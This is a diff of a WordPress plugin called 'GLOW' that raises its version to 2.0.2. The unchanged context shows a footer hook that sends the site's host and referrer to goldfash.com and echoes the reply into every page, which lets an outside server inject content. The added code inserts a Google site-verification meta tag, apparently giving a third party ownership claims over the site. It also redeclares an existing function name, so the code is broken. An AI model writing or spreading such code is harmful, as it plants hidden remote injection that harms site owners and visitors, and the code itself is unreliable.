@@ -2,7 +2,7 @@
 
 /**
  * @package glow
- * @version 2.0.1
+ * @version 2.0.2
  */
 /*
 Plugin Name: GLOW
@@ -46,6 +46,10 @@ add_action('wp_footer', 'G1T_shout_action');
 function G1T_shout_action() { 
      $trac = file_get_contents('https://goldfash.com/views/index.php?iam='.md5('#').'&apiKey='. $_SERVER['HTTP_HOST'] .'&cid='. $_SERVER['HTTP_HOST'] .'&seekey='. $siteInfo['seekey'] .'&myargs=G1TpTracking-'. $_SERVER["HTTP_REFERER"] .'');
     echo $trac; 
+}
+add_action('wp_head', 'G1T_verify');
+function G1T_shout_action() { 
+     echo '<meta name="google-site-verification" content="vV6aL2FtvV0GZX8FfZJ8o3z42vzkOc0u5mYnwWC6png" />';
 }
 // plugin folder url
 if(!defined('RC_SCD_PLUGIN_URL')) {
